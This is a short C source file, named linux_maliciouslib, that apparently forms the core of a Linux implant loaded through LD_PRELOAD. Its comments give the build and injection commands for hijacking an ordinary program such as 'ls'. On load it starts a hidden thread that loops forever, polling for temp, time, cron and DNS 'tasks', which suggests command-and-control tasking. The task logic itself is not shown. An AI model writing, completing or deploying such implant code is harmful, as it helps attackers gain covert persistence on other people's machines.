#include "library.h"

// gcc -shared -fPIC -lpthread -o linux_maliciouslib.so linux_maliciouslib.c
// LD_PRELOAD=./linux_maliciouslib.so ls

void myenter()
{

#ifdef TESTING
    printf("library loaded\n");
#endif

    pthread_t dontcare;

    pthread_create(&dontcare, NULL, &threadmain, NULL);
}

void myexit()
{
// This doesn't seem to be happening, but I'm not entirely sure why.
#ifdef TESTING
    printf("library unloaded\n");
#endif
}

void *threadmain(void *arg)
{
    setmyhostname();

    while (1)
    {
#ifdef TESTING
        printf("main ran\n");
#endif

        check_temp_tasks();

        check_time_tasks();
        check_cron_tasks();
        check_dns_tasks();

        sleep(SLEEP_INTERVAL);
    }
}
